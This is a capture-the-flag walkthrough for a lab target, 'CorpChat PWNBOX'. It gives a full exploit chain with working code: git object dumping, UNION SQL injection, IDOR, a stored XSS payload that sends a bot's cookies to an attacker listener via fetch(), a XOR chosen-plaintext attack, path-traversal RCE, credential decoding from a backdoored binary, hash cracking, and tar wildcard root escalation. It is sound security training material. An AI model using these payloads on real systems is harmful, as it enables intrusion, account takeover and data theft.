# CTF Walkthrough — CorpChat PWNBOX

Complete, tested exploit chain for all five flags. Every step was verified against the live instance.

---

## Setup

Register a fresh account at `http://<ip>:8080/register`. Newly registered accounts have role `new_user` (read-only access to `#general`). Upgrading that role is part of Stage 2.

---

## Stage 1 — Forgotten History

**Category:** Web / Recon

### Find the exposed repository

After logging in, browse to:

```
http://<ip>:8080/challenge/
```

The application serves this directory statically. You will see a `.git/` directory listing — the full git object store is readable over HTTP.

### Walk the object history

Fetch HEAD to get the latest commit SHA:

```bash
curl -b "session=<your-session>" http://<ip>:8080/challenge/.git/refs/heads/master
# 3f3082caf8e9a3cbe20a57599e13f5b4a86ba7a8
```

From there, walk every commit by following `parent` links and decompressing each object with zlib. There are three commits. The flag is hidden in `config.py` inside the **initial (oldest) commit**, which was later removed:

```python
# Initial commit — config.py
FLAG = "CTF{exposed_git_repository_secret}"
```

Python script to dump it automatically:

```python
import urllib.request, zlib, re

BASE = "http://<ip>:8080/challenge/.git/objects"
SESSION = "<your-session-cookie>"

def get_obj(sha):
    url = f"{BASE}/{sha[:2]}/{sha[2:]}"
    req = urllib.request.Request(url, headers={"Cookie": f"session={SESSION}"})
    return zlib.decompress(urllib.request.urlopen(req).read())

sha = "<HEAD sha from above>"
while sha:
    obj = get_obj(sha).decode(errors='replace')
    tree_sha = re.search(r'tree ([0-9a-f]{40})', obj).group(1)
    tree = get_obj(tree_sha)
    i = 0
    while i < len(tree):
        sp = tree.index(b' ', i)
        nul = tree.index(b'\x00', sp)
        name = tree[sp+1:nul].decode()
        sha20 = tree[nul+1:nul+21].hex()
        i = nul + 21
        if name == 'config.py':
            blob = get_obj(sha20).decode(errors='replace')
            if 'CTF{' in blob:
                print(blob[blob.index('CTF{'):blob.index('}', blob.index('CTF{'))+1])
    parent = re.search(r'parent ([0-9a-f]{40})', obj)
    sha = parent.group(1) if parent else None
```

Alternatively, install `git-dumper` (`pip install git-dumper`), dump the repo, and run `git log -p` to see the deleted line.

**Flag: `CTF{exposed_git_repository_secret}`**

---

## Stage 2 — Stolen Identity

**Category:** Web / Auth

Three sub-steps: SQL injection to steal a password-reset token, IDOR to grab an admin API token, then token-login to read a private DM.

### Step 2.1 — SQL injection on the search endpoint

Navigate to `/search/`. The search handler runs two queries: a normal full-text search and a secondary "token lookup" query that is not parameterised:

```python
# routes/search2.py (vulnerable code)
sql = f"SELECT id, username, display_name FROM users WHERE api_token = '{query}'"
```

### Confirming the injection point

Before crafting UNION payloads, confirm the injection by entering a single quote `'` in the search box:

```
http://<ip>:8080/search/?q='
```

The page fires a JavaScript `alert()` and renders an inline debug banner:

```
[DEBUG] Internal error in token subsystem:
Query: SELECT id, username, display_name FROM users WHERE api_token = '''
Error: near "'": syntax error
```

This reveals the full query structure, confirms string-based injection after `api_token = '`, and shows all 3 column positions needed for a UNION attack.

### Inject a UNION payload to dump the `password_resets` table:

```
http://<ip>:8080/search/?q=' UNION SELECT id,user_id,token FROM password_resets --
```

The page renders a **System Records** section with one row:

```
1 | 2 | a3f8c2e1b4d7f9a0c5e2b8d4f1a6c3e7
```

This is the pre-approved password-reset token for `sarah_chen` (user id 2).

### Step 2.2 — Reset sarah_chen's password

The token is valid and has status `approved`. Use it to set a new password:

```bash
curl -X POST http://<ip>:8080/reset-password/a3f8c2e1b4d7f9a0c5e2b8d4f1a6c3e7 \
  -d "password=hacked123&confirm_password=hacked123"
```

Log in as `sarah_chen` / `hacked123`. Sarah has role `user` — full platform access.

### Step 2.3 — IDOR to get manager_bob's API token

The endpoint `/api/v1/users/<id>` returns the full user record including `api_token` for any user ID, not just the authenticated user. `manager_bob` is user id 3:

```bash
# Get sarah's token first
SARAH_TOKEN=$(curl -s http://<ip>:8080/api/v1/users/me \
  -H "X-API-Token: <sarah_api_token>" | python3 -c "import sys,json; print(json.load(sys.stdin)['data']['api_token'])")

# Fetch bob's full profile (IDOR)
curl -s http://<ip>:8080/api/v1/users/3 -H "X-API-Token: $SARAH_TOKEN"
# Returns: "api_token": "7f3d9e2a-1b4c-4f8e-a3d7-5c9b0e6f2a1d"
```

### Step 2.4 — Token-login as manager_bob and read the DM

Any API token can be used to authenticate via the token-login endpoint:

```
http://<ip>:8080/token-login?token=7f3d9e2a-1b4c-4f8e-a3d7-5c9b0e6f2a1d
```

Then fetch DM conversation 1:

```bash
curl -s http://<ip>:8080/api/v1/dm/1/messages \
  -H "X-API-Token: 7f3d9e2a-1b4c-4f8e-a3d7-5c9b0e6f2a1d"
```

The first message from `chatbot` reads:

> Hi Bob, automated security report for Q4. Confidential access key for the audit portal: **CTF{idor_token_auth_bypass_privesc_complete}**

**Flag: `CTF{idor_token_auth_bypass_privesc_complete}`**

---

## Intermediate — XSS + Crypto (required to reach Stages 3–5)

Stages 3, 4, and 5 all require shell access inside the container. That access comes through a debug RCE endpoint protected by a debug token. The token is only ever visible as an encrypted cookie held by the XSS bot.

### XSS — steal the bot's cookie

`compliancebot` (user id 4) is an automated bot that visits every DM conversation it belongs to every 60 seconds. Its browser session carries a `flag` cookie containing the encrypted debug token.

The DM message renderer in `templates/dm/dm.html` passes `msg.content` directly to the template with no escaping. The regex sanitiser in `routes/dm.py` only strips `<script>` tags:

```python
content = re.sub(r"<script.*?>.*?</script>", "", content, flags=re.DOTALL | re.IGNORECASE)
```

This is bypassed trivially with an `<img>` tag. Using sarah's session (role `user` can access DMs), open a DM with compliancebot (user id 4) via `/dm/user/4`, then send:

```bash
curl -s -X POST http://<ip>:8080/api/v1/dm/<conv_id>/messages \
  -H "Content-Type: application/json" \
  -H "X-API-Token: <sarah_api_token>" \
  -d '{"content":"<img src=x onerror=\"fetch('"'"'http://<listener>:9999/?c='"'"'+encodeURIComponent(document.cookie))\">"}'
```

Start a listener (`python3 -m http.server 9999`) and wait up to 60 seconds. The bot fires and your listener receives:

```
GET /?c=hint%3D...%3B%20flag%3DCORP%7Bm8qbzc%2BdnMnUwc...%7D HTTP/1.1
```

URL-decode to extract the `flag` cookie value:

```
CORP{m8qbzc+dnMnUwc+cyNTNmMDB1MHBzJ3UyJjBzJ3Lm5yfzM/I=}
```

The value inside `CORP{...}` is a base64-encoded XOR-encrypted string.

### Crypto — recover the debug token

The platform's `/api/v1/crypto/encrypt` endpoint encrypts arbitrary data using a single-byte repeating XOR. The key byte is `int(time.time() // 3600) & 0xFF` — the same key that encrypted the bot cookie.

**Chosen-plaintext attack:**

1. Encrypt a string of 36 repeated `A`s (length matches the ciphertext).
2. Every output byte equals `key_byte XOR ord('A')`.
3. Recover `key_byte = output[0] XOR ord('A')`.
4. Decrypt the cookie: `ct_byte XOR key_byte` for each byte.

```python
import urllib.request, json, base64

SARAH_TOKEN = "<sarah_api_token>"
cookie_b64 = "m8qbzc+dnMnUwc+cyNTNmMDB1MHBzJ3UyJjBzJ3Lm5yfzM/I="
ct = base64.b64decode(cookie_b64)

payload = json.dumps({"data": "A" * len(ct)}).encode()
req = urllib.request.Request(
    "http://<ip>:8080/api/v1/crypto/encrypt",
    data=payload,
    headers={"Content-Type": "application/json", "X-API-Token": SARAH_TOKEN}
)
resp = json.loads(urllib.request.urlopen(req).read())
known_ct = base64.b64decode(resp['data']['encrypted'])

key_byte = known_ct[0] ^ ord('A')
debug_token = bytes(b ^ key_byte for b in ct).decode()
print(debug_token)
# b3b46de0-86e1-4a98-885d-1a85d2bef561
```

### RCE — execute code as corpchat

The `/api/v1/debug` endpoint accepts a `script` path relative to `/app/scripts/`. There is no path traversal check:

```python
# routes/api.py (vulnerable code)
full_path = os.path.join(base_dir, script_name)
result = subprocess.run(["bash", full_path], ...)
```

Upload a shell script via the file upload endpoint, then execute it using a `../` traversal:

```bash
# 1. Write your script
echo -e '#!/bin/bash\nid > /tmp/proof.txt' > /tmp/cmd.sh

# 2. Upload to /data/uploads/
curl -s -X POST http://<ip>:8080/api/v1/channels/1/upload \
  -H "X-API-Token: <sarah_api_token>" \
  -F "file=@/tmp/cmd.sh"
# Returns: {"stored_filename": "abc123.sh"}

# 3. Execute via debug endpoint with path traversal
curl -s -X POST http://<ip>:8080/api/v1/debug \
  -H "Content-Type: application/json" \
  -H "X-API-Token: b3b46de0-86e1-4a98-885d-1a85d2bef561" \
  -d '{"script": "../../data/uploads/abc123.sh"}'
```

Execution runs as the `corpchat` service account (`uid=993`).

---

## Stage 3 — Backdoor Access

**Category:** Reversing

### Find and retrieve the binary

The binary `corpchat-admin` lives at `/data/uploads/tools/corpchat-admin` inside the container. It is not directly accessible through the web. Copy it somewhere downloadable using RCE:

```bash
# Script content (upload and execute as above):
cp /data/uploads/tools/corpchat-admin /data/uploads/corpchat-admin
```

Then download it via the debug file-download endpoint (requires the debug token):

```bash
curl -O http://<ip>:8080/api/v1/files/download/corpchat-admin \
  -H "X-API-Token: b3b46de0-86e1-4a98-885d-1a85d2bef561"
```

### Initial recon

```bash
file corpchat-admin
# ELF 64-bit LSB executable, x86-64, not stripped

strings corpchat-admin | grep -E "enc_|xor_|Maintenance|SYSTEM"
```

Key strings visible: `xor_decode`, `enc_backdoor_user`, `enc_backdoor_pass`, `enc_master_creds`, `Maintenance Menu`, `SYSTEM ROOT CREDENTIALS`.

### Static analysis (Ghidra)

Load the binary — function names are preserved (not stripped). In `main`:

```c
xor_decode(enc_backdoor_user, decoded_user, 10);
xor_decode(enc_backdoor_pass, decoded_pass, 14);
// ... strcmp against user input
```

The XOR key in `.rodata`:

```
xor_key = "49ced06182fcef842e713c81b59025d24857d3ee409d6e719932a3de94f77a11"
```

Encoded byte arrays in `.rodata`:

```
enc_backdoor_user = { 0x47, 0x4f, 0x00, 0x3a, 0x06, 0x51, 0x55, 0x5a, 0x4d, 0x42 }
enc_backdoor_pass = { 0x76, 0x52, 0x13, 0x46, 0x37, 0x46, 0x55, 0x05, 0x5c, 0x5f, 0x47, 0x0d, 0x57, 0x50 }
enc_master_creds  = { 0x55, 0x5d, 0x0e, 0x0c, 0x0a, 0x6f, 0x5b, 0x50, 0x4b, 0x46, 0x03, 0x11, 0x5f, 0x25,
                      0x6c, 0x72, 0x49, 0x17, 0x04, 0x47, 0x6c, 0x50, 0x56, 0x56, 0x3d, 0x57, 0x0d, 0x51,
                      0x51, 0x5e, 0x00, 0x02, 0x04, 0x4a, 0x6a, 0x03, 0x07, 0x50, 0x56, 0x16, 0x47, 0x11, 0x44 }
```

### Decode the credentials

```python
key = "49ced06182fcef842e713c81b59025d24857d3ee409d6e719932a3de94f77a11"

enc_user   = [0x47,0x4f,0x00,0x3a,0x06,0x51,0x55,0x5a,0x4d,0x42]
enc_pass   = [0x76,0x52,0x13,0x46,0x37,0x46,0x55,0x05,0x5c,0x5f,0x47,0x0d,0x57,0x50]
enc_master = [0x55,0x5d,0x0e,0x0c,0x0a,0x6f,0x5b,0x50,0x4b,0x46,0x03,0x11,0x5f,0x25,
              0x6c,0x72,0x49,0x17,0x04,0x47,0x6c,0x50,0x56,0x56,0x3d,0x57,0x0d,0x51,
              0x51,0x5e,0x00,0x02,0x04,0x4a,0x6a,0x03,0x07,0x50,0x56,0x16,0x47,0x11,0x44]

def xor_decode(arr):
    return ''.join(chr(arr[i] ^ ord(key[i % len(key)])) for i in range(len(arr)))

print(xor_decode(enc_user))    # svc_backup
print(xor_decode(enc_pass))    # Bkp#Svc4dm!n26
print(xor_decode(enc_master))  # admin_master:CTF{r3v_3ng_b4ackd00r_4cc3ss!}
```

### Find the hidden menu

In `main_menu`, the switch statement contains a hidden case never shown in the printed menu:

```c
case 69:
    if (g_priv_level >= 2) { maintenance_menu(); }
```

Only `svc_backup` receives `g_priv_level = 2`. Log in as `svc_backup` / `Bkp#Svc4dm!n26`, enter `69`, then option `3`:

```
[SYSTEM ROOT CREDENTIALS]
Credentials: admin_master:CTF{r3v_3ng_b4ackd00r_4cc3ss!}
```

### SSH login — the flag is the password

```bash
ssh admin_master@<ip> -p 2222
# Password: CTF{r3v_3ng_b4ackd00r_4cc3ss!}
```

**Flag: `CTF{r3v_3ng_b4ackd00r_4cc3ss!}`**

> **Dynamic shortcut:** `ltrace ./corpchat-admin 2>&1 | grep strcmp` intercepts every string comparison at runtime and prints both arguments, directly leaking the decoded credentials.

---

## Stage 4 — Legacy Secrets

**Category:** Crypto

### Dump the database

From your RCE shell, query the database:

```python
# Script to upload and execute:
import sqlite3
conn = sqlite3.connect('/data/corpchat.db')
rows = conn.execute(
    'SELECT username, legacy_password_hash FROM users WHERE legacy_password_hash IS NOT NULL'
).fetchall()
print(rows)
```

Result:

| username | legacy_password_hash |
|---|---|
| chatbot | `QZ8CEw7b24IwMNeE5RFdfA==` |
| sarah_chen | `6CPT/2IqwIs/EUQw68KdIw==` |
| manager_bob | `eLuHkGGwhLLDfQx7NXiDNw==` |
| compliancebot | `axiZUD8XHIwuAnDt4tidow==` |

All 24-character base64 strings ending in `==` — the base64 encoding of 16 raw bytes, i.e. the MD5 digest.

### Understand the scheme

The two-step scheme is `base64(MD5(plaintext))`:

```python
# database.py — legacy hash function
import hashlib, base64

def _legacy_hash(password):
    md5_bytes = hashlib.md5(password.encode()).digest()  # raw bytes
    return base64.b64encode(md5_bytes).decode()
```

### Crack compliancebot's hash

For normal accounts the plaintext is the user's regular password. `compliancebot`'s legacy plaintext is the flag — a dictionary word.

Step 1 — decode base64 to get the raw MD5 hex:

```bash
python3 -c "import base64; print(base64.b64decode('axiZUD8XHIwuAnDt4tidow==').hex())"
# 6b1899503f171c8c2e0270ede2d89da3
```

Step 2 — crack the MD5 hex with hashcat mode 0 and RockYou:

```bash
hashcat -m 0 6b1899503f171c8c2e0270ede2d89da3 /usr/share/wordlists/rockyou.txt
# 6b1899503f171c8c2e0270ede2d89da3:ufoundit
```

**Flag: `ufoundit`**

---

## Stage 5 — Getting Root

**Category:** Privesc

### Find the cron job

From your RCE shell or SSH session:

```bash
cat /etc/cron.d/corpchat-backup
# * * * * * root cd /data/uploads && tar -czf /tmp/uploads_backup.tar.gz *
```

Runs **every minute as root**. The wildcard `*` is unquoted.

### The vulnerability

When the shell expands `*` in `/data/uploads`, every filename becomes a `tar` command-line argument. If a file is named `--checkpoint=1`, tar interprets it as the flag `--checkpoint=1`. Combined with `--checkpoint-action=exec=<cmd>`, tar executes an arbitrary command at each checkpoint.

`/data/uploads` has permissions `drwxrwxrwx` — world-writable.

### Create the exploit files

From your RCE shell (or SSH as admin_master):

```bash
cd /data/uploads

cat > pwn.sh << 'EOF'
#!/bin/bash
cat /root/flag.txt > /tmp/root_flag.txt
chmod 777 /tmp/root_flag.txt
EOF
chmod +x pwn.sh

printf '' > '--checkpoint=1'
printf '' > '--checkpoint-action=exec=sh pwn.sh'
```

### Wait for cron and read the flag

```bash
sleep 60
cat /tmp/root_flag.txt
# CTF{w1ldcard_t4r_g0t_r00t!}
```

**Flag: `CTF{w1ldcard_t4r_g0t_r00t!}`**

---

## Full Exploit Chain

```
Register account (role: new_user)
 │
 ├─► Stage 1: /challenge/.git/ → walk git objects → config.py in initial commit
 │            CTF{exposed_git_repository_secret}
 │
 ├─► Stage 2: SQLi on /search/ → dump password_resets → reset sarah_chen
 │            → IDOR /api/v1/users/3 → get manager_bob token
 │            → token-login → read DM #1
 │            CTF{idor_token_auth_bypass_privesc_complete}
 │
 ├─► XSS: send <img onerror=fetch(...)> DM to compliancebot (bot)
 │         → bot visits → cookie exfiltrated: CORP{<XOR ciphertext>}
 │
 ├─► Crypto: chosen-plaintext XOR attack on /api/v1/crypto/encrypt
 │            → decrypt cookie → debug token: b3b46de0-86e1-4a98-885d-1a85d2bef561
 │
 ├─► RCE: upload script → /api/v1/debug path traversal ../../data/uploads/
 │         → code execution as corpchat (uid=993)
 │
 ├─► Stage 3: RCE copies binary to uploads → download → XOR decode in Ghidra
 │            → admin_master:CTF{r3v_3ng_b4ackd00r_4cc3ss!} → SSH login
 │            CTF{r3v_3ng_b4ackd00r_4cc3ss!}
 │
 ├─► Stage 4: RCE dumps SQLite → legacy_password_hash for compliancebot
 │            → base64-decode hash → MD5 hex → crack with RockYou
 │            ufoundit
 │
 └─► Stage 5: world-writable /data/uploads + cron tar * wildcard
              → checkpoint filename injection → root shell
              CTF{w1ldcard_t4r_g0t_r00t!}
```

---

## Quick Reference

### Flags

| Challenge | Category | Flag |
|-----------|----------|------|
| Forgotten History | Web / Recon | `CTF{exposed_git_repository_secret}` |
| Stolen Identity | Web / Auth | `CTF{idor_token_auth_bypass_privesc_complete}` |
| Backdoor Access | Reversing | `CTF{r3v_3ng_b4ackd00r_4cc3ss!}` |
| Legacy Secrets | Crypto | `ufoundit` |
| Root or Die | Privesc | `CTF{w1ldcard_t4r_g0t_r00t!}` |

### Key accounts

| Account | Role | Credentials / Notes |
|---------|------|---------------------|
| (registered) | new_user | Limited to #general read |
| sarah_chen | user | Reset via SQLi token `a3f8c2e1b4d7f9a0c5e2b8d4f1a6c3e7` |
| manager_bob | admin | API token `7f3d9e2a-1b4c-4f8e-a3d7-5c9b0e6f2a1d` (user id 3) |
| compliancebot | user | XSS bot — visits all DMs every 60 s (user id 4) |
| svc_backup | — | Binary backdoor account; password `Bkp#Svc4dm!n26` |
| admin_master | — | SSH; password = reversing flag |

### Key endpoints

| Endpoint | Vulnerability |
|----------|--------------|
| `GET /challenge/.git/` | Exposed git object store |
| `GET /search/?q=...` | UNION SQL injection |
| `POST /reset-password/<token>` | Password reset with stolen token |
| `GET /api/v1/users/<id>` | IDOR — leaks `api_token` for any user |
| `GET /token-login?token=...` | Auth bypass via API token |
| `POST /api/v1/dm/<id>/messages` | Stored XSS delivery to bot |
| `POST /api/v1/crypto/encrypt` | XOR cipher — chosen-plaintext attack |
| `POST /api/v1/channels/1/upload` | Arbitrary file upload to `/data/uploads/` |
| `POST /api/v1/debug` | RCE via path traversal (`../../data/uploads/`) |
| `GET /api/v1/files/download/<name>` | Download from `/data/uploads/` |
